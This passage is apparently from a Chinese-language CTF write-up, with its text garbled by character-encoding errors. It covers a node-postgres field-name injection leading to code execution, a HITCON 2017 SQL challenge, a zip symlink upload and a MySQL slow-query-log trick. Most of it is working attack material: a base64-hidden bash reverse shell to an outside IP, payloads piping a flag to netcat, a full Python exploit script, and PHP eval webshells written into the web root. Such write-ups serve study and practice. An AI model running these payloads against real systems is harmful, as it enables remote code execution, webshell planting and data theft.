&lt;p>åŸç†å‘¢ï¼Œå°±æ˜¯ç»å…¸çš„è½¬ä¹‰ä¸å…¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">inlineParser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fieldName&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;\nthis[&amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#75715e">// fields containing single quotes will break
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// the evaluated javascript unless they are escaped
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// see https://github.com/brianc/node-postgres/issues/507
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Addendum: However, we need to make sure to replace all
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// occurences of apostrophes, not just the first one.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// See https://github.com/brianc/node-postgres/issues/934
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fieldName&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;#39;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;\\&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#39;] = &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#d88200">&amp;#39;rowData[&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;] == null ? null : parsers[&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;](rowData[&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;]);&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>fileNameå°±æ˜¯å­—æ®µåï¼Œåªå¯¹å•å¼•å·å‰åŠ åæ–œæ &lt;code>fileName.replace(/'/g, &amp;quot;\\'&amp;quot;)&lt;/code>ï¼Œæˆ‘ä»¬åªè¦å†åŠ ä¸€ä¸ªåæ–œæ å°±èƒ½é€ƒé€¸äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æœ‰äº†å¯æ§çš„å­—æ®µå&lt;/p>
&lt;p>æˆ‘ä»¬ä¸Šé¢çš„payloadä¼ å…¥ä¹‹åä¼šæ˜¯è¿™æ ·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#d88200">&amp;#39;SELECT * FROM &amp;#34;user&amp;#34; WHERE &amp;#34;id&amp;#34; = 1;select 1 as &amp;#34;\\&amp;#39;&lt;/span> &lt;span style="color:#111">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#111">)]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¯¶ï¼Œé—­åˆäº†ï¼›å¦‚æœåœ¨ä¸­é—´è§£æçš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°ä¼ å…¥Functionç±»çš„å‡½æ•°ä½“ctorBodyå€¼ä¸º&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;\\&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">)]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">//&amp;#39;] = rowData[0] == null ? null : parsers[0](rowData[0]);
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç¡®å®ï¼Œæ‰§è¡Œçš„å°±æ˜¯æˆ‘ä»¬çš„æ¶æ„è¯­å¥&lt;/p>
&lt;p>æ„é€ åå¼¹shellçš„pocï¼Œæ‰§è¡Œå³å¯åå¼¹shellï¼ˆä¸æˆåŠŸçš„è¯è®°å¾—æŠŠurlencodeçš„special charså‹¾ä¸Šï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#f92672">/?&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">SELECT&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#00a8c8">AS&lt;/span> &lt;span style="color:#d88200">&amp;#34;\&amp;#39;]=0;require=process.mainModule.constructor._load;/*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#00a8c8">AS&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/p=require(`child_process`);/*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#00a8c8">AS&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#00a8c8">AS&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/`cC8xMDEuMzUuMTE0LjEwNy84NDI2IDA+JjE=|base64 -d|bash`)//&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117164222973.png" alt="image-20211117164222973">&lt;/p>
&lt;p>å…¶ä¸­æ ¸å¿ƒpayloadåˆ†å‰²åç”¨b64ç¼–ç +åå¼•å·æ¥æ‰§è¡Œè¯­å¥ï¼›Functionç¯å¢ƒä¸‹æ²¡æœ‰&lt;code>require()&lt;/code>å‡½æ•°ï¼Œä¸èƒ½è·å¾—&lt;code>child_process&lt;/code>æ¨¡å—ï¼Œä½¿ç”¨&lt;code>process.mainModule.constructor._load&lt;/code>æ¥ä»£æ›¿&lt;code>require&lt;/code>&lt;/p>
&lt;p>ä¿®å¤æ–¹æ³•æ˜¯å°†&lt;code>fileName.replace(/'/g, &amp;quot;\\'&amp;quot;)&lt;/code>ä¿®æ”¹ä¸º&lt;code>escape(fileName)&lt;/code>ï¼Œå¯¹å¤§éƒ¨åˆ†æœ‰é—®é¢˜å­—ç¬¦è¿›è¡Œè½¬ä¹‰&lt;/p>
&lt;h3 id="mysqlçš„max_allowed_packet">mysqlçš„&lt;code>max_allowed_packet&lt;/code>&lt;/h3>
&lt;p>é»˜è®¤æœ€å¤§16Mï¼Œè¶…è¿‡åˆ™å…³é—­è¿æ¥ä¸æ‰§è¡Œsqlè¯­å¥ï¼Œä¸ä¼šæŠŠæˆ‘ä»¬æ­¤æ¬¡æŸ¥è¯¢çš„è®°å½•ä¿ç•™ä¸‹æ¥ï¼Œå¯ä»¥ç»•è¿‡waf&lt;/p>
&lt;h3 id="postgresqlç‰¹æ®Šè¯­å¥">postgresqlç‰¹æ®Šè¯­å¥&lt;/h3>
&lt;p>ç‰¹æ€§ï¼šæ”¯æŒå°†16è¿›åˆ¶çš„å€¼è½¬æ¢ä¸ºunicodeå­—ç¬¦ï¼Œå¹¶ä¸”å¯ä»¥è‡ªå®šä¹‰è½¬ä¹‰ç¬¦&lt;/p>
&lt;p>åˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥ç»•wafï¼Œç©ºæ ¼ç”¨&lt;code>\t&lt;/code>ç»•è¿‡ï¼Œè‡ªå®šä¹‰è½¬ä¹‰ç¬¦è®¾ä¸ºæ„Ÿå¹å·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&amp;#39;)\tON\tCONFLICT\t(username)\tDO\tUPDATE\tSET\tusername=&amp;#39;&amp;#39;\tRETURNING\t1\tAS\tU&amp;amp;&amp;#34;!005c!0027+(r=process.mainModule.require,l=!0022!0022)]!002f!002f&amp;#34;\tUESCAPE\t&amp;#39;&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#d88200">&amp;#39;,\t1\tAS\tU&amp;amp;&amp;#34;!005c!0027+(l+=!0022!002freadflag|nc!0020123.123!0022)]!002f!002f&amp;#34;\tUESCAPE\t&amp;#39;&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#d88200">&amp;#39;,\t1\tAS\tU&amp;amp;&amp;#34;!005c!0027+(l+=!0022.123.123!00201234!0022)]!002f!002f&amp;#34;\tUESCAPE\t&amp;#39;&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#d88200">&amp;#39;,\t1\tAS\tU&amp;amp;&amp;#34;!005c!0027+(r(!0022child_process!0022).execSync(l))]!002f!002f&amp;#34;\tUESCAPE\t&amp;#39;&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#d88200">&amp;#39;;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™é“é¢˜çš„sqlæ³¨å…¥ç‚¹åœ¨updateä¹‹å&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">INSERT&lt;/span> &lt;span style="color:#00a8c8">INTO&lt;/span> &lt;span style="color:#111">users&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">VALUES&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;${username}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;${password}&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">ON&lt;/span> &lt;span style="color:#111">CONFLICT&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">DO&lt;/span> &lt;span style="color:#00a8c8">NOTHING&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸€æ ·çš„æ€è·¯ï¼Œå…ˆé—­åˆï¼Œåœ¨æ„é€ æ­£å¸¸çš„jsè¯­å¥&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;quot;&amp;quot;','')/*%s*/returning(1)as&amp;quot;\\'/*&amp;quot;,(1)as&amp;quot;\\'*/-(a=`child_process`)/*&amp;quot;,(2)as&amp;quot;\\'*/-(b=`/readflag|nc 10.188.2.20 9999`)/*&amp;quot;,(3)as&amp;quot;\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//&amp;quot;--&amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>è¿˜å¾—ç»“åˆä¸€ä¸‹å‰é¢é‚£ä¸ª16Mçš„æº¢å‡º&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ€åæ˜¯å®Œæ•´çš„expï¼Œæ¥è‡ªäºorangeä½¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">random&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">randint&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#75715e"># payload = &amp;#34;union&amp;#34;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&amp;#39;,&amp;#39;&amp;#39;)/*&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">*/returning(1)as&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;/*&amp;#34;,(1)as&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;*/-(a=`child_process`)/*&amp;#34;,(2)as&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;*/-(b=`/readflag|nc 10.188.2.20 9999`)/*&amp;#34;,(3)as&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">&amp;#39;*/-console.log(process.mainModule.require(a).exec(b))]=1//&amp;#34;--&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">65535&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;password&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;AAAAAA&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;ok&amp;#39;&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://10.188.2.20:12345/reg&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ·±è‚²è¿™ä¸ªé¢˜ä¸è¿‡æ˜¯æŠŠç™½ç›’å®¡è®¡æ¢æˆäº†é»‘ç›’ï¼Œæ€è·¯ä¸€æ¨¡ä¸€æ ·ï¼Œå°±ä¸ç»†å—¦äº†&lt;/p>
&lt;p>å‚è€ƒwpï¼š&lt;a href="https://github.com/t3hp0rP/hitconDockerfile">hitconDockerfile&lt;/a>/&lt;a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017">hitcon-ctf-2017&lt;/a>/&lt;a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/sql-so-hard">sql-so-hard&lt;/a>/ï¼ˆæœ‰è¿™ä½å¸ˆå‚…è‡ªåˆ¶çš„dockerå¯ä»¥è‡ªè¡Œå¤ç°ï¼‰&lt;/p>
&lt;h2 id="zipzip">ZipZip&lt;/h2>
&lt;p>é¡µé¢æºç æç¤ºï¼šå¬è¯´å‹ç¼©åŒ…æ–‡ä»¶ä¹Ÿèƒ½getshellï¼›å‹ç¼©åŒ…çš„ä¸€ä¸ªå¸¸è€ƒç‚¹æ˜¯è½¯é“¾æ¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸è¿‡è„‘å­å¤ªæœ¨äº†æ²¡æƒ³åˆ°å¦‚ä½•å†™shellè¿›å»ï¼Œçœ‹äº†wpä»¥åæ‰æ˜ç™½&lt;/p>
&lt;p>ä¸Šä¼ zipä¹‹åå›æ˜¾çš„è·¯å¾„æ˜¯/tmp/uploadsï¼Œæ˜¾ç„¶æ— æ³•æ­£å¸¸è®¿é—®ï¼›è¿™é‡Œå¯ä»¥åˆ©ç”¨è½¯é“¾æ¥å°†shellå†™å…¥/var/www/html&lt;/p>
&lt;p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæŒ‡å‘/var/www/html/ç›®å½•çš„è½¯é“¾æ¥å¹¶zipå‹ç¼©ä¸Šä¼ &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /var/www/html/ l1
zip -ry l1.zip l1
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åå»ºç«‹ä¸€ä¸ªå’Œè½¯é“¾æ¥åå­—ç›¸åŒçš„ç›®å½•ï¼Œåœ¨é‡Œé¢å†™shellï¼Œä¹‹åå°†è¿™ä¸ªåŒåçš„ç›®å½•æ•´ä¸ªzipå‹ç¼©ä¸Šä¼ &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e"># å½“å‰ç›®å½•/var/www/html/&lt;/span>
mkdir l1 &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">cd&lt;/span> l1
&lt;span style="color:#111">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php eval($_GET[&amp;#39;&lt;/span>wuhu&lt;span style="color:#d88200">&amp;#39;]);?&amp;gt;&amp;#39;&lt;/span> &amp;gt; shell.php
&lt;span style="color:#111">cd&lt;/span> ../ &lt;span style="color:#75715e"># ç»§ç»­è½¬åˆ°/var/www/html/&lt;/span>
zip -r l2.zip ./*
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å³å¯å†™å…¥shell&lt;/p>
&lt;h2 id="weblog">***WebLog&lt;/h2>
&lt;p>ä¸€æ‰“å¼€å°±ä¼šä¸‹è½½ä¸€ä¸ªlogæ–‡ä»¶ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆå†…å®¹ï¼Œä¿®æ”¹getå‚æ•°ä¸º&lt;code>/?logname=logs/info/info.2021-11-12.log&lt;/code>å¯ä»¥å¾—åˆ°çœŸæ­£çš„logï¼Œå¯ä»¥çœ‹åˆ°æ˜¯javaï¼Œæˆ‘çˆ¬äº†&lt;/p>
&lt;h2 id="easysql">easysql&lt;/h2>
&lt;blockquote>
&lt;p>long_query_time&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211114115940931.png" alt="image-20211114115940931">&lt;/p>
&lt;p>å¸¸ç”¨çš„selectã€å•åŒå¼•å·ã€æ‹¬å·ã€åˆ†å·ã€setã€showã€variablesã€ç­‰éƒ½æ²¡æœ‰è¿‡æ»¤ï¼Œè¯­å¥é—­åˆæ–¹å¼ä¸ºæ‹¬å·ï¼Œç™¾åå•ä¸ºæ•°æ®åº“è®°å½•è¡Œæ•°ï¼Œä½¿ç”¨&lt;code>1);{sqlinject}--+&lt;/code>å¯ä»¥é—­åˆæŸ¥è¯¢è¯­å¥+å †å æ³¨å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>show variables like '%slow_query_log%'; # æŸ¥è¯¢æ…¢æ—¥å¿—è®°å½•æ˜¯å¦å¼€å¯
setglobal slow_query_log=1; # å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—
setglobal slow_query_log_file='/var/www/html/helpyou2findflag.php' # è®¾ç½®æ…¢æŸ¥è¯¢æ—¥å¿—ä½ç½®
&lt;/code>&lt;/pre>&lt;p>æ…¢æŸ¥è¯¢ï¼Œé¡¾åæ€ä¹‰æ—¶é—´é•¿çš„æŸ¥è¯¢è®°å½•ä¼šè¢«è®°å½•ä¸‹æ¥ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠlong_query_timeçš„é»˜è®¤å€¼æ”¹æ‰ï¼Œç„¶åå†™å…¥shell&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#111">setglobal&lt;/span> &lt;span style="color:#111">long_query_time&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#ae81ff">000001&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">--+
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">show&lt;/span> &lt;span style="color:#111">variables&lt;/span> &lt;span style="color:#00a8c8">like&lt;/span> &lt;span style="color:#d88200">&amp;#39;long_query_time&amp;#39;&lt;/span>&lt;span style="color:#111">l&lt;/span>&lt;span style="color:#75715e">--+
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php $_REQUEST[a]($_REQUEST[b])?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">--+
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…ç”¨benchmarkè¿™æ ·çš„å‡½æ•°å»¶é•¿æ‰§è¡Œæ—¶é—´&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#00a8c8">set&lt;/span> &lt;span style="color:#00a8c8">GLOBAL&lt;/span> &lt;span style="color:#111">slow_query_log_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/var/www/html/helpyou2findflag.php&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">set&lt;/span> &lt;span style="color:#00a8c8">GLOBAL&lt;/span> &lt;span style="color:#111">slow_query_log&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">on&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">set&lt;/span> &lt;span style="color:#00a8c8">GLOBAL&lt;/span> &lt;span style="color:#111">log_queries_not_using_indexes&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">on&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">x3c3f706870206576616c28245f504f53545b315d293b3f3e&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#111">mysql&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">db&lt;/span> &lt;span style="color:#00a8c8">where&lt;/span> &lt;span style="color:#111">BENCHMARK&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5000000000&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">MD5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">x5476556d&lt;/span>&lt;span style="color:#111">));&lt;/span>&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#ae81ff">23&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>flagä½äº/home/rainbow/ssh.log&lt;/p>
&lt;hr>
